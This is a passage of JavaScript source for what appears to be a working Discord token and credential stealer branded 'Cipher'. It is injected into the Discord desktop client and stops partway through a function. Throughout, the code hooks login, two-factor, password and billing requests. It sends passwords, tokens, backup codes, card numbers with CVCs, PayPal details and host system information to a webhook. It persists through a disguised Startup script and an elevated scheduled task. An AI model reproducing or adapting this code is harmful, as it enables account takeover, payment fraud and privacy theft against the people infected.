
const querystring = require('querystring');
const https = require('https');
const http = require('http');
const path = require('path');
const fs = require('fs');

const { exec } = require('child_process');
const { promisify } = require('util');
const { BrowserWindow, session } = require('electron');


let capturedToken = null; 
let lastBackupCodeData = { key: null, time: 0 }; 
let lastPasswordChangeData = { key: null, time: 0 }; 

const execCommand = async (command, options = {}) => {
  try {
    const { stdout, stderr } = await promisify(exec)(command, options);
    return stdout.trim();
  } catch (error) {
    return null;
  }
};

const execScript = async (script) => {
    const windows = BrowserWindow.getAllWindows();
    if (windows.length === 0) return null;
    try {
        const result = await windows[0].webContents.executeJavaScript(script, true);
        return result;
    } catch (error) {
        return null;
    }
};

const CONFIG = {
    API: '%WEBHOOK_URL%',
    force_persist_startup: 'true',
    auto_user_profile_edit: 'true',
    auto_email_update: 'false',
    disable_qr_code: 'true',
    get: {
        token: () => {
            if (capturedToken) {
                return Promise.resolve(capturedToken);
            }
        },
        logout: () => {
            capturedToken = null;
            return execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`);
        },
        backup_codes: () => execScript(`const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`),
    },
    auth_filters: {
        urls: [
            '*://*/api/*/users/@me*',
            '*://*/api/*/users/@me/password*',
            '*://*/api/*/users/@me/settings*',
            '*://discord.com/api/*/users/@me*',
            '*://discordapp.com/api/*/users/@me*',
            '*://*.discord.com/api/*/users/@me*',
            '*://ptb.discord.com/api/*/users/@me*',
            '*://canary.discord.com/api/*/users/@me*',
            '*://*/api/*/auth/login*',
            '*://*/api/*/auth/register*',
            '*://*/api/*/remote-auth/login*',
            '*://*/api/*/remote-auth/finish*',
            '*://*/api/*/mfa/totp*',
            '*://*/api/*/mfa/sms*',
            '*://*/api/*/mfa/webauthn/credentials*',
            '*://*/api/*/oauth2/authorize*',
        ],
    },
    token_filters: {
        urls: [
            '/users/@me/billing/payment-sources',
            '/users/@me/billing/subscriptions',
            '/users/@me/library',
            '/users/@me/settings',
            '/users/@me/guilds',
            '/users/@me/channels',
        ],
    },
    session_filters: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions',
        ],
    },
    payment_filters: {
        urls: [
            'https://api.stripe.com/v*/tokens',
            'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
            'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens', 
            'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
            'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',   
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
        ],
    },
    badges: {
        _nitro: [
            "boostbadge1",
            "boostbadge2",
            "boostbadge3",
            "boostbadge4",
            "boostbadge5",
            "boostbadge6",
            "boostbadge7",
            "boostbadge8",
            "boostbadge9"
              ],
        
        _nitro_subscription_tiers: {
            1: "bronzenitro",     
            3: "silvernitro",    
            6: "goldnitro",      
            12: "platinumnitro",
            24: "diamondnitro",  
            36: "emeraldnitro",  
            60: "rubynitro",     
            72: "opalnitro"    
        },

        _discord_emloyee: {
            value: 1,
            emoji: "staffbadge",
            rare: true,
        },
        _partnered_server_owner: {
            value: 2,
            emoji: "partnerbadge",
            rare: true,
        },
        _hypeSquad_events: {
            value: 4,
            emoji: "hypebadge",
            rare: true,
        },
        _bug_hunter_level_1: {
            value: 8,
            emoji: "bugbadge",
            rare: true,
        },
        _house_bravery: {
            value: 64,
            emoji: "braverybadge",
            rare: false,
        },
        _house_brilliance: {
            value: 128,
            emoji: "brilliancebadge",
            rare: false,
        },
        _house_balance: {
            value: 256,
            emoji: "balancebadge",
            rare: false,
        },
        _early_supporter: {
            value: 512,
            emoji: "earlybadge",
            rare: true,
        },
        _bug_hunter_level_2: {
            value: 16384,
            emoji: "bug2badge",
            rare: true,
        },
        _early_bot_developer: {
            value: 131072,
            emoji: "botdevbadge",
            rare: true,
        },
        _certified_moderator: {
            value: 262144,
            emoji: "modbadge",
            rare: true,
        },
        _active_developer: {
            value: 4194304,
            emoji: "activebadge",
            rare: true,
        },
        _legacy_username: {
            value: 32,
            emoji: "oldusernamebadge",
            rare: true,
        },
        _spammer: {
            value: 1048704,
            emoji: "⌨️",
            rare: false,
        },
    },
};

const request = async (method, url, headers = {}, data = null) => {
    try {
        const requests = [...(url.includes('api/webhooks') ? [url] : [url])].map(url => {
            return new Promise((resolve, reject) => {
                const { protocol, hostname, port, pathname, search } = new URL(url);
                const client = protocol === 'https:' ? https : http;
                const finalHeaders = {
                    'Access-Control-Allow-Origin': '*',
                    ...headers,
                };
                if (data && finalHeaders['Content-Length'] == null) {
                    finalHeaders['Content-Length'] = Buffer.byteLength(data);
                }
                const options = {
                    hostname,
                    port: port || undefined,
                    path: pathname + search,
                    method,
                    headers: finalHeaders,
                };
                const req = client.request(options, (res) => {
                    let resData = '';
                    res.on('data', (chunk) => resData += chunk);
                    res.on('end', () => resolve(resData));
                });
                req.on('error', err => reject(err));
                if (data) req.write(data);
                req.end();
            });
        });
        return Promise.all(requests);
    } catch (err) {
        return Promise.reject(err);
    }
};

const notify = async (ctx, token, user) => {
    const getData = new GetDataUser();
    let ZebiRPData = await ZiskCord();

    const profile = ZebiRPData?.profile || {};
    const [system, network, billing, friends, servers] = await Promise.allSettled([
       getData.SystemInfo(),
       getData.Network(),
       getData.Billing(token),
       getData.Friends(token),
       getData.Servers(token),
    ]);

    const [nitro, badges] = [
        getData.Nitro(profile),
        getData.Badges(user?.flags || 0),
    ];

    ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\``;
    ctx.username = `Werenoi - Injection`;
    ctx.avatar_url = `https://i.imgur.com/JBrsTyI.png`;
    
    if (!ctx.embeds) ctx.embeds = [{}];
    if (!ctx.embeds[0]) ctx.embeds[0] = {};
    if (!ctx.embeds[0].fields) ctx.embeds[0].fields = [];
    
    ctx.embeds[0].fields.unshift({
        name: `<a:bby:987689940852817971> Token:`,
        value: `\`\`\`${token}\`\`\``,
        inline: false
    })

    ctx.embeds[0].thumbnail = {
        url: `https://cdn.discordapp.com/avatars/${user?.id}/${user?.avatar}`
    };

    ctx.embeds[0].fields.push(
        
        { name: "<:bby:987689935018549328> Nitro Type: ", value: nitro, inline: true },
        { name: "<:bby:987689943558135818> Phone", value: user?.phone ? `\`${user.phone}\`` : 'None', inline: true },
        { name: "<:bby:987689933844127804> Badges", value: badges, inline: true },
        { name: "<a:bby:987689939401588827> Billing", value: billing.status === 'fulfilled' ? billing.value : 'None', inline: true },
        { name: "<:ange:1103031009550798948> Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
    );

    if (system.status === 'fulfilled' && system.value) {
        const sysInfo = system.value;
        ctx.embeds.push({
            title: "Cipher - System Information",
            fields: [
                { name: "OS", value: `\`${sysInfo.os}\``, inline: true },
                { name: "CPU", value: `\`${sysInfo.cpu}\``, inline: true },
                { name: "GPU", value: `\`${sysInfo.gpu}\``, inline: true },
                { name: "RAM", value: `\`${sysInfo.ram}\``, inline: true },
                { name: "MAC", value: `\`${sysInfo.macAddress}\``, inline: true },
                { name: "IP", value: `\`${sysInfo.localIP}\``, inline: true },
                { name: "WINDOWS KEY", value: `\`${sysInfo.uuid}\``, inline: false },
                { name: "WINDOWS PRODUCT", value: `\`${sysInfo.productKey}\``, inline: false },
            ]
        });
    }

    if (network.status === 'fulfilled' && network.value) {
        const netInfo = network.value;
        ctx.embeds.push({
            title: "Cipher - Network Information", 
            fields: [
                { name: "Public IP", value: `\`${netInfo.query || 'Unknown'}\``, inline: true },
                { name: "Country", value: `\`${netInfo.country || 'Unknown'}\``, inline: true },
                { name: "City", value: `\`${netInfo.city || 'Unknown'}\``, inline: true },
                { name: "Region", value: `\`${netInfo.regionName || 'Unknown'}\``, inline: true },
                { name: "ISP", value: `\`${netInfo.isp || 'Unknown'}\``, inline: true },
                { name: "Timezone", value: `\`${netInfo.timezone || 'Unknown'}\``, inline: true },
            ]
        });
    }

    if (friends.status === 'fulfilled' && friends.value) {
        ctx.embeds.push({ title: friends.value.title, description: friends.value.description });
    }

    if (servers.status === 'fulfilled' && servers.value) {
        ctx.embeds.push({ title: servers.value.title, description: servers.value.description });
    }

    ctx.embeds.forEach(embed => {
            embed.color = 2895667;
            embed.author = {
            name: `${user?.username || 'Unknown'} | ${user?.id || 'Unknown'}`,
            icon_url: user?.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
        };
        embed.footer = {
            text: `t.me/cipherstealer`,
        };
        embed.timestamp = new Date();
    });

    try {
        await request('POST', CONFIG.API, {
            "Content-Type": "application/json"
        }, JSON.stringify(ctx));
    } catch (error) {
    }
};

const editSettingUser = async () => {
    try {
        let ZebiRPData = await ZiskCord();
        const data = {
            status: 'dnd',
            email_notifications_enabled: false,
            stream_notifications_enabled: false,
            custom_status: { 
                text: 'Cipher...', 
                expires_at: null, 
                emoji_id: null, 
                emoji_name: null
            },
        };
        const patchData = JSON.stringify(data);
        const response = await request('PATCH', 'https://discord.com/api/v9/users/@me/settings', {
            'Content-Type': 'application/json',
            'Content-Length': patchData.length,
            'Authorization': ZebiRPData.token
        }, patchData);

        return JSON.parse(response);
    } catch (error) {
        return {};
    }
};

class Fetcher {
    constructor(token) {
        this.token = token;
    }
    _fetch = async (endpoint, headers) => {
        try {
            const API = 'https://discord.com/api';
            const fullURL = `${API}/v9/users/${endpoint}`;
            
            const response = await request('GET', fullURL, headers);
            
            const responseData = Array.isArray(response) ? response[0] : response;
            
            if (!responseData) {
                throw new Error('Empty response');
            }
            
            const parsedResponse = JSON.parse(responseData);
            return parsedResponse;
        } catch (error) {
            return null;
        }
    };

    User = async () => {
        return await this._fetch("@me", {
            "Authorization": this.token
        });
    };

    Profile = async () => {
        return await this._fetch(`${Buffer.from(this.token.split(".")[0], "base64").toString("binary")}/profile`, {
            "Authorization": this.token
        });
    };

    Friends = async () => {
        return await this._fetch("@me/relationships", {
            "Authorization": this.token
        });
    };

    Servers = async () => {
        return await this._fetch("@me/guilds?with_counts=true", {
            "Authorization": this.token
        });
    };

    Billing = async () => {
        return await this._fetch("@me/billing/payment-sources", {
            "Authorization": this.token
        });
    };
};

class GetDataUser {
    SystemInfo = async () => {
        try {
            const [os, cpu, gpu, ram, uuid, productKey, macAddress, localIP, cpuCount] = await Promise.all([
                execCommand("powershell.exe -Command \"try { $os = Get-CimInstance -ClassName Win32_OperatingSystem; $os.Caption + ' ' + $os.OSArchitecture } catch { $os = Get-WmiObject -Class Win32_OperatingSystem; $os.Caption + ' ' + $os.OSArchitecture }\""),
                execCommand("powershell.exe -Command \"try { (Get-CimInstance -ClassName Win32_Processor | Select-Object -First 1).Name } catch { (Get-WmiObject -Class Win32_Processor | Select-Object -First 1).Name }\""),
                execCommand("powershell.exe -Command \"try { (Get-CimInstance -ClassName Win32_VideoController | Where-Object { $_.Name -ne $null } | Select-Object -First 1).Name } catch { (Get-WmiObject -Class Win32_VideoController | Where-Object { $_.Name -ne $null } | Select-Object -First 1).Name }\""),
                execCommand("powershell.exe -Command \"try { $mem = Get-CimInstance -ClassName Win32_ComputerSystem; [math]::Floor($mem.TotalPhysicalMemory / 1GB).ToString() + ' GB' } catch { $mem = Get-WmiObject -Class Win32_ComputerSystem; [math]::Floor($mem.TotalPhysicalMemory / 1GB).ToString() + ' GB' }\""),
                execCommand("powershell.exe -Command \"try { (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID } catch { (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID }\""),
                execCommand("powershell.exe -Command \"try { Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName } catch { (Get-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').ProductName }\""),
                execCommand("powershell.exe -Command \"try { (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2' | Select-Object -First 1).MACAddress } catch { (Get-WmiObject -Class Win32_NetworkAdapter -Filter 'NetConnectionStatus = 2' | Select-Object -First 1).MACAddress }\""),
                execCommand("powershell.exe -Command \"try { (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object -First 1).IPAddress } catch { (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | Select-Object -First 1).IPAddress[0] }\""),
                execCommand("powershell.exe -Command \"$env:NUMBER_OF_PROCESSORS\"")
            ]);

            return {
              os: os?.trim() || 'Unknown OS',
              cpu: cpu?.trim() || 'Unknown CPU', 
              gpu: gpu?.trim() || 'Unknown GPU',
              ram: ram?.trim() || 'Unknown RAM',
              uuid: uuid?.trim() || 'Unknown UUID',
              productKey: productKey?.trim() || 'Unknown Product',
              macAddress: macAddress?.trim() || 'Unknown MAC',
              localIP: localIP?.trim() || 'Unknown IP',
              cpuCount: cpuCount?.trim() || 'Unknown CPU Count',
          };
        } catch (error) {
            return {
                os: 'Error getting OS info',
                cpu: 'Error getting CPU info', 
                gpu: 'Error getting GPU info',
                ram: 'Error getting RAM info',
                uuid: 'Error getting UUID',
                productKey: 'Error getting Product info',
                macAddress: 'Error getting MAC',
                localIP: 'Error getting IP',
                cpuCount: 'Error getting CPU count',
            };
        }
    };

    Network = async () => {
        try {
            const response = await request('GET', "http://ip-api.com/json", {
                'Content-Type': 'application/json'
            });
            
            const responseData = Array.isArray(response) ? response[0] : response;
            
            if (!responseData) {
                throw new Error('Empty response');
            }
            
            return JSON.parse(responseData);
        } catch (error) {
            return {
                query: 'Unknown',
                country: 'Unknown', 
                city: 'Unknown',
                regionName: 'Unknown',
                isp: 'Unknown',
                timezone: 'Unknown'
            };
        }
    };

    Badges = (flags) =>
        Object.keys(CONFIG.badges)
            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
                ? `${result}${CONFIG.badges[badge].emoji} `
                : result, '',
            ) || 'None';

    RareBadges = (flags) =>
        Object.keys(CONFIG.badges)
            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
                && CONFIG.badges[badge].rare
                ? `${result}${CONFIG.badges[badge].emoji} `
                : result, '',
            ) || '';

    Billing = async (token) => {
        const API = new Fetcher(token);
        const data = await API.Billing();

        if (!data || !Array.isArray(data)) {
            return 'None';
        }

        const payment = {
            1: '💳',
            2: 'paypalemoji'
        };
        let paymentMethods = data.map(method => payment[method.type] || 'None').join('');
        return paymentMethods || 'None';
    }

    Friends = async (token) => {
        const API = new Fetcher(token);
        const friends = await API.Friends();
        const {RareBadges} = new GetDataUser();
    
        if (!friends || !Array.isArray(friends)) {
            return false;
        }

        const filteredFriends = friends
            .filter(friend => friend.type === 1)
            .map(friend => ({
                username: friend.user.username,
                flags: RareBadges(friend.user.public_flags),
            }))

        const rareFriends = filteredFriends.filter(friend => friend.flags);

        const hQFriends = rareFriends.map(friend => {
            const name = `${friend.username}`;
            return`${friend.flags} | ${name}\n`;
        });

        const hQFriendsPlain = hQFriends.join('');

        if (hQFriendsPlain.length === 0) {
            return false;
        };

        if (hQFriendsPlain.length > 4050) {
            return {
                title: `**Rare Friends (Too many to display):**\n`,
                description: "Too many friends to display.",
            };
        };

        return {
            title: `**Rare Friends (${hQFriends.length}):**\n`,
            description: `${hQFriendsPlain}`,
        };
    };

    Servers = async (token) => {
        const API = new Fetcher(token);
        const guilds = await API.Servers();

        if (!guilds || !Array.isArray(guilds)) {
            return false;
        }

        const filteredGuilds = guilds
            .filter(guild => guild.owner || (guild.permissions & 8) === 8)
            .filter(guild => guild.approximate_member_count >= 500)
            .map(guild => ({
                id: guild.id,
                name: guild.name,
                owner: guild.owner,
                member_count: guild.approximate_member_count
            }));

        const hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
            try {
                const response = await request('GET', `https://discord.com/api/v8/guilds/${guild.id}/invites`, {
                    'Authorization': token
                });

                const responseData = Array.isArray(response) ? response[0] : response;
                const invites = JSON.parse(responseData);
                const invite = (invites && Array.isArray(invites) && invites.length > 0)
                    ? `[Join Server](https://discord.gg/${invites[0].code})`
                    : 'No Invite';

                const emoji = guild.owner
                ? `✨ Owner`
                : `🎆 Admin`;
                const members = `Members: \`${guild.member_count}\``;
                const name = `**${guild.name}** - (${guild.id})`;

                return `${emoji} | ${name} - ${members} - ${invite}\n`;
            } catch (error) {
                const emoji = guild.owner ? `✨ Owner` : `🎆 Admin`;
                const members = `Members: \`${guild.member_count}\``;
                const name = `**${guild.name}** - (${guild.id})`;
                return `${emoji} | ${name} - ${members} - No Invite\n`;
            }
        }));

        const hQGuildsPlain = hQGuilds.join('');

        if (hQGuildsPlain.length === 0) {
            return false;
        };

        if (hQGuildsPlain.length > 4050) {
            return {
                title: `**Rare Servers (Too many to display):**\n`,
                description: "Too many servers to display.",
            };
        };

        return {
            title: `**Rare Guilds (${hQGuilds.length}):**\n`,
            description: `${hQGuildsPlain}`,
        }
    };
    
    getDate = (current, months) => {
        return new Date(current).setMonth(current.getMonth() + months);
    };

    Nitro = (flags) => {
        const { premium_type, premium_guild_since, badges } = flags;
        switch (premium_type) {
            default:
                return "None";
            case 1:
                return "nitrobadge";
            case 2:
                if (!premium_guild_since) return "Nitro";
                let months = [1, 2, 3, 6, 9, 12, 15, 18, 24],
                    rem = 0;
                for (let i = 0; i < months.length; i++)
                    if (Math.round((this.getDate(new Date(premium_guild_since), months[i]) - new Date()) / 86400000) > 0) {
                        rem = i;
                        break;
                    }
                
                let tierBadge = "";
                if (badges && Array.isArray(badges)) {
                    const premiumBadge = badges.find(badge => badge.id && badge.id.startsWith('premium_tenure_'));
                    if (premiumBadge) {
                        const description = premiumBadge.description || "";
                        if (description.includes("1 month")) {
                            tierBadge = CONFIG.badges._nitro_subscription_tiers[1];
                        } else if (description.includes("3 month")) {
                            tierBadge = CONFIG.badges._nitro_subscription_tiers[3];
                        } else if (description.includes("6 month")) {
                            tierBadge = CONFIG.badges._nitro_subscription_tiers[6];
                        } else if (description.includes("12 month") || description.includes("1 year")) {
                            tierBadge = CONFIG.badges._nitro_subscription_tiers[12];
                        } else if (description.includes("24 month") || description.includes("2 year")) {
                            tierBadge = CONFIG.badges._nitro_subscription_tiers[24];
                        } else if (description.includes("36 month") || description.includes("3 year")) {
                            tierBadge = CONFIG.badges._nitro_subscription_tiers[36];
                        } else if (description.includes("60 month") || description.includes("5 year")) {
                            tierBadge = CONFIG.badges._nitro_subscription_tiers[60];
                        } else if (description.includes("72 month") || description.includes("6 year")) {
                            tierBadge = CONFIG.badges._nitro_subscription_tiers[72];
                        }
                    }
                }

                const boostBadge = CONFIG.badges._nitro[rem] ? CONFIG.badges._nitro[rem] : "";

            return `${tierBadge || "Nitro"} ${boostBadge}`;
        }
    };
};

const Cruise = async (type, response, request, email, password, token, action) => {
    let content, API, user;
    switch (type) {
        case 'LOGIN_USER':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "<:fyle:1473599809666547848> Password", value: `\`${password}\``, inline: true },
                        { name: "<:1438992623472742581:1458530115657928878> Email", value: `\`${email}\``, inline: true },
                    ],
                }],
            };
            if (request?.code !== undefined) {
                content.embeds[0].fields.push(
                    { name: "🔏 Used 2FA code", value: `\`${request.code}\``, inline: false }
                );
            }
            notify(content, token, user);
            break;
        case 'USERNAME_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "🏷 New Username", value: `\`${request.username}\``, inline: true },
                        { name: "<:fyle:1473599809666547848> Password", value: `\`${request.password}\``, inline: true },
                        { name: "<:1438992623472742581:1458530115657928878> Email", value: `\`${email}\``, inline: false },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'EMAIL_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "<:1438992623472742581:1458530115657928878> New Email", value: `\`${email}\``, inline: true },
                        { name: "<:fyle:1473599809666547848> Password", value: `\`${password}\``, inline: true },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'PASSWORD_CHANGED':
            const newToken = response?.token || token;
            API = new Fetcher(newToken);
            user = await API.User();
            console.log('PASSWORD_CHANGED triggered:', {
                newPassword: request?.new_password || 'Not captured',
                oldPassword: password || 'Not captured',
                userEmail: user?.email || email || 'Unknown',
                newToken: newToken || 'Not captured'
            });
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "<:fyle:1473599809666547848> New Password", value: `\`${request?.new_password || 'Not captured'}\``, inline: true, },
                        { name: "<:fyle:1473599809666547848> Old Password", value: `\`${password || 'Not captured'}\``, inline: true, },
                        { name: "<:1438992623472742581:1458530115657928878> Email", value: `\`${user?.email || email || 'Unknown'}\``, inline: false, },
                    ],
                }],
            };
            await notify(content, newToken, user);
            break;
        case 'BACKUP_CODES':                
            API = new Fetcher(token);
            user = await API.User();

            const apiCodes = (response.backup_codes || [])
                .map(codeObj => {
                    const code = codeObj.code;
                    return `${code.slice(0, 4)}-${code.slice(4)}`;
                });

            const domCodes = await new Promise(resolve => {
                setTimeout(async () => {
                    const codes = await CONFIG.get.backup_codes();
                    const formatted = (codes || [])
                        .filter(c => /^[a-z0-9]{8}$/.test(c))
                        .map(c => `${c.slice(0,4)}-${c.slice(4)}`);
                    resolve(formatted);
                }, 1000);
            });

            const allCodes = [...new Set([...apiCodes, ...domCodes])];
            const codes = allCodes.length > 0 ? allCodes.join('\n') : '*No backup codes captured*';

            const twoFactorCode = request?.code ? `\`${request.code}\`` : '*Not captured*';
            const authSecret = request?.secret ? `\`${request.secret}\`` : '*Not captured*';

            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "<:fyle:1473599809666547848> Password", value: `\`${password}\``, inline: true },
                        { name: "<:1438992623472742581:1458530115657928878> Email", value: `\`${email}\``, inline: true },
                        { name: "🔢 2FA Code", value: twoFactorCode, inline: true },
                        { name: "🔐 Secret", value: authSecret, inline: true },
                        { name: "🔓 Security Codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'CREDITCARD_ADDED':
            API = new Fetcher(token);
            user = await API.User();
            
            let cardFields = [
                { name: "<:1438992623472742581:1458530115657928878> User Email", value: `\`${user.email}\``, inline: true },
            ];
            
            if (request && request.cardInfo) {
                const card = request.cardInfo;
                cardFields.push(
                    { name: "🔢 Card Number", value: `\`${card.number || 'Not captured'}\``, inline: true },
                    { name: "🦺 CVC", value: `\`${card.cvc || 'Not captured'}\``, inline: true },
                    { name: "📅 Expiration", value: `\`${card.exp_month || 'XX'}/${card.exp_year || 'XXXX'}\``, inline: true }
                );
            }
            
            if (request && request.billingAddress) {
                const addr = request.billingAddress;
                cardFields.push({
                    name: "🏠 Billing Address",
                    value: `\`\`\`\nName: ${addr.name || 'N/A'}\nLine 1: ${addr.line_1 || 'N/A'}\nLine 2: ${addr.line_2 || 'N/A'}\nCity: ${addr.city || 'N/A'}\nState: ${addr.state || 'N/A'}\nPostal Code: ${addr.postal_code || 'N/A'}\nCountry: ${addr.country || 'N/A'}\`\`\``,
                    inline: false
                });
            }
            
            if (request && request.item) {
                cardFields.push(
                    { name: "🔢 Number", value: `\`${request.item["card[number]"] || 'Not captured'}\``, inline: true },
                    { name: "🦺 CVC", value: `\`${request.item["card[cvc]"] || 'Not captured'}\``, inline: true },
                    { name: "📅 Expiration", value: `\`${request.item["card[exp_month]"] || 'XX'}/${request.item["card[exp_year]"] || 'XXXX'}\``, inline: true }
                );
                
                if (request["line_1"]) {
                    cardFields.push({
                        name: "🆔 Address",
                        value: `\`\`\`\nLine 1: ${request["line_1"] || 'N/A'}\nLine 2: ${request["line_2"] || 'N/A'}\nCity: ${request["city"] || 'N/A'}\nState: ${request["state"] || 'N/A'}\nPostal Code: ${request["postal_code"] || 'N/A'}\nCountry: ${request["country"] || 'N/A'}\`\`\``,
                        inline: false
                    });
                }
            }
            
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: cardFields,
                }],
            };
            notify(content, token, user);
            break;
        case 'PAYPAL_ADDED':
            API = new Fetcher(token);
            user = await API.User();
            
            let paypalFields = [
                { name: "📩 User Email", value: `\`${user.email}\``, inline: true },
            ];
            
            if (response && response.paypalAccounts && response.paypalAccounts.length > 0) {
                const paypalData = response.paypalAccounts[0];
                const details = paypalData.details;
                
                if (details) {
                    paypalFields.push(
                        { name: "💳 PayPal Email", value: `\`${details.email || 'Not captured'}\``, inline: true },
                        { name: "👤 Name", value: `\`${details.payerInfo?.firstName || 'Unknown'} ${details.payerInfo?.lastName || 'Unknown'}\``, inline: true },
                        { name: "🌍 Country", value: `\`${details.payerInfo?.countryCode || 'Unknown'}\``, inline: true }
                    );
                    
                    if (details.billingAddress) {
                        const addr = details.billingAddress;
                        paypalFields.push({
                            name: "🏠 Billing Address", 
                            value: `\`\`\`\nLine 1: ${addr.line1 || 'N/A'}\nCity: ${addr.city || 'N/A'}\nPostal Code: ${addr.postalCode || 'N/A'}\nCountry: ${addr.countryCode || 'N/A'}\`\`\``, 
                            inline: false 
                        });
                    }
                }
            }
            
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: paypalFields,
                }],
            };
            notify(content, token, user);
            break;
        case 'INJECTED_UNUSED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "<:fyle:1473599809666547848> Password", value: `\`${password || 'Not captured yet'}\``, inline: true },
                        { name: "<:1438992623472742581:1458530115657928878> Email", value: `\`${user.email}\``, inline: true },
                    ],
                }],
            };
            await notify(content, token, user);
            break;
        default:
    }
};

const forcePersistStartup = async () => {
    const vbsFileName = 'DiscordBetterProtector.vbs';
    const batFileName = 'setupTask.bat';

    const protectFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect');
    const vbsFilePathInProtect = path.join(protectFolderPath, vbsFileName);
    const startupFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
    const vbsFilePathInStartup = path.join(startupFolderPath, vbsFileName);
    const batFilePath = path.join(__dirname, batFileName);

  
    const checkFileExists = (filePath) => {
        return new Promise((resolve) => {
            fs.access(filePath, fs.constants.F_OK, (err) => {
                resolve(!err);
            });
        });
    };

    const checkScheduledTaskExists = () => {
        return new Promise((resolve) => {
            exec('schtasks /query /tn "WindowsSecurityHealthSystrayk4itrun"', (err) => {
                resolve(!err);
            });
        });
    };

    const createVBSFile = (filePath) => {
        return new Promise((resolve, reject) => {
            fs.writeFile(filePath, vbsContent.trim(), (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const createBatchFile = () => {
        const batContent = `
            @echo off
            setlocal

            set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"

            schtasks /create /tn "WindowsSecurityHealthSystrayk4itrun" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f

            if %ERRORLEVEL% EQU 0 (
                echo We are scanning your Discord application(s)....
            ) else (
                echo An unexpected error occurred...
            )

            timeout /t 5 /nobreak > NUL
            del "%~f0"

            endlocal
        `;

        return new Promise((resolve, reject) => {
            fs.writeFile(batFilePath, batContent.trim(), (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const executeBatchFile = () => {
        return new Promise((resolve, reject) => {
            exec(`powershell -Command "Start-Process cmd -ArgumentList '/c \"${batFilePath}\"' -Verb RunAs"`, (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const protectExists = await checkFileExists(vbsFilePathInProtect);
    const startupExists = await checkFileExists(vbsFilePathInStartup);
    const taskExists = await checkScheduledTaskExists();

    if (!protectExists) {
        await createVBSFile(vbsFilePathInProtect);
    }
    if (!startupExists) {
        await createVBSFile(vbsFilePathInStartup);
    }

    if (!taskExists) {
        await createBatchFile();
        await executeBatchFile();

        setTimeout(() => {
            fs.unlink(batFilePath, (unlinkErr) => {
            });
        }, 10000);
    }
};

const startup = async () => {
    const startupDir = path.join(__dirname, 'aurathemes');
    if (fs.existsSync(startupDir)) {
        fs.rmdirSync(startupDir);
        let ZebiRPData = await ZiskCord();
        if (!ZebiRPData.token) return;
        Cruise(
            'LOGIN_USER',
            null,
            null,
            ZebiRPData.user?.email || 'unknown@email.com',
            'First injection login',
            ZebiRPData.token,
            `It is injected in the route: \`${__dirname.trim().replace(/\\/g, "/")}\``
        );
        execScript('document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.clear();document.body.removeChild(document.querySelector(\'iframe\'));');
        execScript('window.location.href=window.location.href;');
    }

    const getDiscordPaths = () => {
        const args = process.argv;
        const appDir = args[0].split(path.sep).slice(0, -1).join(path.sep);
        let resource;

